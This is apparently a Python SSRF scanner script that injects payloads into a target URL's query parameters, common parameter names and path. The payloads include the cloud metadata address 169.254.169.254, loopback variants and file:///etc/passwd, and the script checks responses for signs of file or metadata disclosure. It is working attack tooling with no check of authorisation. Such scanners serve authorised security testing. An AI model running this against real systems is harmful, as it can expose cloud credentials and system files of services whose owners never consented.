import requests
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

def run():
    print("\n🌐 Smart SSRF Vulnerability Scanner\n")

    target = input("Enter target URL: ")

    # Payloads
    payloads = [
        "http://127.0.0.1",
        "http://localhost",
        "http://169.254.169.254/latest/meta-data/",
        "http://0.0.0.0:80",
        "http://[::1]",
        "http://2130706433",
        "file:///etc/passwd"
    ]

    # Common parameter names
    common_params = ["url", "uri", "link", "image", "file", "path", "dest", "redirect"]

    headers = {
        "User-Agent": "Mozilla/5.0 (SSRF-Scanner)",
        "Accept": "*/*"
    }

    parsed = urlparse(target)
    params = parse_qs(parsed.query)

    # 🔍 Function to test a URL
    def test_request(test_url, payload):
        print(f"\n➡️ Testing: {test_url}")

        try:
            start = time.time()
            r = requests.get(test_url, headers=headers, timeout=5)
            end = time.time()

            response_time = round(end - start, 2)

            if "root:x" in r.text:
                print("💥 SSRF! Local file disclosure")

            elif "meta-data" in r.text or "ami-id" in r.text:
                print("💥 SSRF! Cloud metadata exposed")

            elif response_time > 3:
                print("⚠️ Possible Blind SSRF")

            elif r.status_code == 200:
                print("⚠️ Possible SSRF (manual check needed)")

            else:
                print("✅ No obvious SSRF")

        except Exception as e:
            print("❌ Error:", e)

    # ==============================
    # CASE 1: URL HAS PARAMETERS
    # ==============================
    if params:
        print("\n🔍 Found parameters:", list(params.keys()))

        for param in params:
            print(f"\n🎯 Testing parameter: {param}")

            for payload in payloads:
                test_params = params.copy()
                test_params[param] = payload

                new_query = urlencode(test_params, doseq=True)
                test_url = urlunparse(parsed._replace(query=new_query))

                test_request(test_url, payload)

    # ==============================
    # CASE 2: NO PARAMETERS
    # ==============================
    else:
        print("\n⚠️ No parameters found. Trying smart injection...\n")

        # Try common parameters
        for param in common_params:
            for payload in payloads:
                new_query = urlencode({param: payload})
                test_url = urlunparse(parsed._replace(query=new_query))

                test_request(test_url, payload)

        # Try path-based injection
        print("\n🔍 Trying path-based injection...\n")

        for payload in payloads:
            test_url = target.rstrip("/") + "/" + payload
            test_request(test_url, payload)


# 🔒 Prevent auto execution when imported
if __name__ == "__main__":
    run()